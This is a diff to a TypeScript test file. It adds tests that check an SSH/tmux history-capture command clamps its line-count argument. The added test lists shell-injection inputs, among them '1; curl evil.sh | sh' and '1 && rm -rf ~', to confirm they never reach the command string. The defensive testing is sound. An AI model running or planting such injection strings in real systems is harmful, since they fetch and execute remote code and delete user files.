@@ -17,7 +17,7 @@ import {
   remoteEndpointFileContents,
   scpArgs
 } from './control-master'
-import { clampHistoryLines } from '../pty-manager'
+import { clampHistoryLines } from '../history-limits'
 
 const conn = { host: 'h.example.com', user: 'deploy', port: 2222, identityFile: '/k/id' }
 
@@ -197,5 +197,22 @@ describe('remoteCaptureHistoryArgs', () => {
     const cmd = remoteCaptureHistoryArgs(conn, '/tmp/cm', 'nt-x', n).slice(-1)[0]
     expect(cmd).not.toContain('curl')
     expect(cmd).toContain('capture-pane -p -e -t nt-x -S -5000 -E -1')
+  })
+  it('clamps at the sink: a hostile value passed DIRECTLY never reaches the command string', () => {
+    // A future call site (IPC handler / Server Edition shell) that forgets the caller-side clamp
+    // must still not be able to build `tmux … -S -1; curl evil.sh | sh -E -1`.
+    const hostile = ['1; curl evil.sh | sh', '1 && rm -rf ~', '$(id)', '`id`', '1\nid'] as unknown as number[]
+    for (const bad of hostile) {
+      const cmd = remoteCaptureHistoryArgs(conn, '/tmp/cm', 'nt-x', bad).slice(-1)[0]
+      expect(cmd, String(bad)).toContain('capture-pane -p -e -t nt-x -S -5000 -E -1')
+      expect(cmd, String(bad)).not.toMatch(/[;&|`$()\n]/)
+    }
+  })
+  it('clamps out-of-range numbers at the sink (floor 1, ceiling 5000, NaN → default)', () => {
+    const cmdFor = (n: number): string => remoteCaptureHistoryArgs(conn, '/tmp/cm', 'nt-x', n).slice(-1)[0]
+    expect(cmdFor(-1)).toContain('-S -1 -E -1')
+    expect(cmdFor(10_000_000)).toContain('-S -5000 -E -1')
+    expect(cmdFor(NaN)).toContain('-S -5000 -E -1')
+    expect(cmdFor(12.9)).toContain('-S -12 -E -1')
   })
 })
